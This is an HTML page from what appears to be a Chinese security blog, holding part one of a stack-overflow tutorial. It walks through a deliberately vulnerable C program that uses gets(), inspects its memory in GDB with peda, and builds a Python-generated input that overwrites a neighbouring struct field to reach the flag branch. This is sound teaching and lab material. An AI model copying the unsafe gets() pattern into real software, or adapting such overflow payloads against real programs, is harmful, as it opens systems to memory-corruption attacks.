@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（一） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（一） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/776/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（一）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-20 12:46"><i class="iconfont icon-date"></i>2017-10-20 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>这将是一个连载，也是我的学习过程的记录，有任何问题麻烦拉到页面最下方，使用评论功能告诉我。</p>
+
+<p>贵司的猫猫 <code class="highlighter-rouge">哞哞</code> 镇楼</p>
+
+<p><img src="https://storage.virusdefender.net/blog/images/776/1.JPG" alt="" /></p>
+
+<p>首先假设已经有了 C 语言的基础知识，还有简单的汇编和了解内存栈结构，如果这些也不懂，还是需要先回去学习基础知识。</p>
+
+<p>以后不特殊说明的话，环境都是 <code class="highlighter-rouge">Ubuntu 16.04.2 x86-64</code> <code class="highlighter-rouge">gcc version 5.4.0</code> <code class="highlighter-rouge">GDB version 7.11.1</code>。</p>
+
+<h2 id="安装-peda">安装 peda</h2>
+
+<p>peda 是 GDB 的一个插件，提供了很多方便我们调试和漏洞利用的功能。源码和安装方式在 <a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
+
+<p>下面的代码我也忘了来源了，反正是充满了暴力气息的一段代码。</p>
+
+<pre><code class="language-clike">#include &lt;stdio.h&gt;
+
+struct Student {
+    char name[64];
+    char s;
+    int birth;
+};
+
+int main(int argc, char **argv) {
+    struct Student student;
+    student.s = 'c';
+    printf("What's Your Birth?\n");
+    scanf("%d", &amp;student.birth);
+    while (getchar() != '\n') ;
+    if (student.birth == 1926) {
+        printf("You Cannot Born In 1926!\n");
+        return 0;
+    }
+    printf("What's Your Name?\n");
+    gets(student.name);
+    printf("You Are Born In %d\n", student.birth);
+    if (student.birth == 1926) {
+        printf("You Shall Have The Flag.\n");
+        system("cat flag");
+    } else {
+        printf("You Are Naive.\n");
+        printf("You Spend One Second Here.\n");
+    }
+    return 0;
+}
+</code></pre>
+
+<p><code class="highlighter-rouge">gcc -g -O0 -o vuln main.c</code> 编译</p>
+
+<h2 id="gdb调试指令">GDB调试指令</h2>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb ./vuln
+</code></pre>
+</div>
+
+<p>如果成功安装了peda，就可以看到 <code class="highlighter-rouge">gdb-peda$</code> 的提示了。</p>
+
+<p>常用的指令就不多说了，比如 <code class="highlighter-rouge">list(l)</code> <code class="highlighter-rouge">break(b)</code> 等。</p>
+
+<p>通过 <code class="highlighter-rouge">l</code> 浏览了代码，就可以使用 <code class="highlighter-rouge">b $line_number</code> 的方式下断点了，比如想让代码停在 14 行，然后看 <code class="highlighter-rouge">student</code> 变量的内存分布，那我们可以输入<code class="highlighter-rouge">b 14</code>。</p>
+
+<p>通过 <code class="highlighter-rouge">info breakpoints</code> 可以看到所有的断点。</p>
+
+<p><code class="highlighter-rouge">r</code> 指令是运行这个调试程序，然后看到进程成功的停在了我们的断点处。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r
+
+...
+
+Breakpoint 1, main (argc=0x1, argv=0x7fffffffe568) at main.c:14
+14	    printf("What's Your Birth?\n");
+</code></pre>
+</div>
+
+<p>至于下面的一堆汇编输出，我们后面再说。</p>
+
+<h2 id="万物皆可-print">万物皆可 print</h2>
+
+<p>下断点就是为了查看 <code class="highlighter-rouge">student</code> 结构体的内存分布，C 语言里面很多函数在这里也是类似的用法的。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p sizeof(student)
+$1 = 0x48
+gdb-peda$ p sizeof(student.birth)
+$2 = 0x4
+gdb-peda$ p sizeof(student.name)
+$3 = 0x40
+gdb-peda$ p sizeof(student.s)
+$4 = 0x1
+
+gdb-peda$ p &amp;student
+$5 = (struct Student *) 0x7fffffffe2f0
+gdb-peda$ p &amp;(student.name)
+$6 = (char (*)[64]) 0x7fffffffe2f0
+gdb-peda$ p &amp;(student.s)
+$7 = 0x7fffffffe330 "c\344\377\377\205\a"
+gdb-peda$ p &amp;(student.birth)
+$8 = (int *) 0x7fffffffe334
+</code></pre>
+</div>
+
+<p>可以看到 <code class="highlighter-rouge">student</code> 结构体是 72 个字节大小，<code class="highlighter-rouge">student</code> 结构体和 <code class="highlighter-rouge">student.name</code> 起始内存地址都是 <code class="highlighter-rouge">0x7fffffffe2f0</code>，因为在内存中本来就没有结构体这种东西。</p>
+
+<p>至于为什么是 72 个字节，而不是 <code class="highlighter-rouge">4+64+1=69</code> 个字节呢？</p>
+
+<p>那是因为 <code class="highlighter-rouge">s</code> 成员是 <code class="highlighter-rouge">char</code> 类型的，1 个字节，如果接下来就存储 <code class="highlighter-rouge">birth</code>，那么这就是一个跨边界的数据，计算机可能需要更多的指令才能读取，为了加快内存访问速度进行了内存对齐操作，把 <code class="highlighter-rouge">s</code> 所在的内存后面空了 3 个字节，关于内存对齐，可以参考 <a href="https://github.com/ludx/The-Lost-Art-of-C-Structure-Packing">https://github.com/ludx/The-Lost-Art-of-C-Structure-Packing</a></p>
+
+<h2 id="查看指定的内存地址的数据">查看指定的内存地址的数据</h2>
+
+<p>这里使用的是 <code class="highlighter-rouge">x</code> 指令，它有三个可选参数 <code class="highlighter-rouge">x/&lt;n/f/u&gt; $addr</code></p>
+
+<p><code class="highlighter-rouge">n</code> 是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的 <code class="highlighter-rouge">u</code> 定义。</p>
+
+<p><code class="highlighter-rouge">f</code> 表示显示的格式，比如 <code class="highlighter-rouge">x</code> 按十六进制格式显示变量, <code class="highlighter-rouge">d</code> 是按十进制格式显示变量。</p>
+
+<p><code class="highlighter-rouge">u</code> 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。<code class="highlighter-rouge">u</code>参数可以用下面的字符来代替，<code class="highlighter-rouge">b</code> 表示单字节，<code class="highlighter-rouge">h</code> 表示双字节，<code class="highlighter-rouge">w</code> 表示四字节，<code class="highlighter-rouge">g</code> 表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p>
+
+<p>为了打印 <code class="highlighter-rouge">student</code> 结构体的内存分布，先在第 21 行下断点，然后让进程继续执行直到下一个断点。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+Breakpoint 2 at 0x40079d: file main.c, line 21.
+gdb-peda$ c
+Continuing.
+What's Your Name?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+...
+
+Legend: code, data, rodata, value
+
+Breakpoint 2, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
+21	    printf("You Are Born In %d\n", student.birth);
+</code></pre>
+</div>
+
+<p>然后就可以</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ x/72xb &amp;student
+0x7fffffffe2f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe2f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe300:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe308:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe310:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe318:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe320:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe328:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x00
+0x7fffffffe330:	0x63	0xe4	0xff	0xff	0x85	0x07	0x00	0x00
+</code></pre>
+</div>
+
+<p>前 64 个字节就是字母 <code class="highlighter-rouge">A</code> 的 ASCII <code class="highlighter-rouge">0x41</code>，然后是 <code class="highlighter-rouge">0x00</code> 字符串结尾，然后是代码中写死的 <code class="highlighter-rouge">c</code> 字母 <code class="highlighter-rouge">0x63</code>，然后跳过三个字节之后还剩四个字节，就是一个 <code class="highlighter-rouge">int</code> 数字。</p>
+
+<p>从最后 4 个字节分布可以看出来，对于 <code class="highlighter-rouge">int 0x00000785</code> 这种多字节变量，它们的低字节在内存低地址处，高字节在内存高地址处，这种分布方式称为小端序，还有的机器是反过来的，叫做大端序。对于 <code class="highlighter-rouge">char</code> 这种单字节变量和 <code class="highlighter-rouge">student.name</code> 这种数组来说，没有大小端的问题，</p>
+
+<h2 id="分析内存结构">分析内存结构</h2>
+
+<p>这里问题就很清晰了，<code class="highlighter-rouge">student.name</code> 数组没有限制长度，如果我们输入超过 63 位的话，多出来的内容将覆盖 <code class="highlighter-rouge">student.s</code> 的内存（注意字符串的结尾），如果输入再长的话，就会覆盖 <code class="highlighter-rouge">student.birth</code> 的内存空间。</p>
+
+<p>所以我们可以确定 <code class="highlighter-rouge">student.name</code> 的输入长度是 70 字节，前面 68 字节可以是任意构造，只要认真构造最后两个字节，让 <code class="highlighter-rouge">student.birth</code> 的内存为 <code class="highlighter-rouge">0x00000786</code> 就可以，所以我们构造的payload就是<code class="highlighter-rouge">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x07</code></p>
+
+<p>然后这种特殊的字符我们都可以使用 Python 输入到文件中，然后重定向输入的</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  Desktop python -c "print '1234\n' + 'A' * 68 + '\x86\x07\n'" &gt; 1.in
+➜  Desktop ./vuln &lt; 1.in
+What's Your Birth?
+What's Your Name?
+You Are Born In 1926
+You Shall Have Flag.
+THIS_IS_FLAG
+</code></pre>
+</div>
+
+<p>GDB 也可以使用这种重定向输入的</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ b 21
+Breakpoint 1 at 0x40079d: file main.c, line 21.
+gdb-peda$ r &lt; 1.in
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; 1.in
+What's Your Birth?
+What's Your Name?
+
+...
+
+Breakpoint 1, main (argc=0x1, argv=0x7fffffffe428) at main.c:21
+21	    printf("You Are Born In %d\n", student.birth);
+gdb-peda$ x/72xb &amp;student
+0x7fffffffe2f0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe2f8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe300:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe308:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe310:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe318:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe320:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe328:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe330:	0x41	0x41	0x41	0x41	0x86	0x07	0x00	0x00
+</code></pre>
+</div>
+
+<p>可以看到我们控制了 <code class="highlighter-rouge">student</code> 的内存，让代码进入了指定的分支。</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（一）&article_id=/index.php/archives/776/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
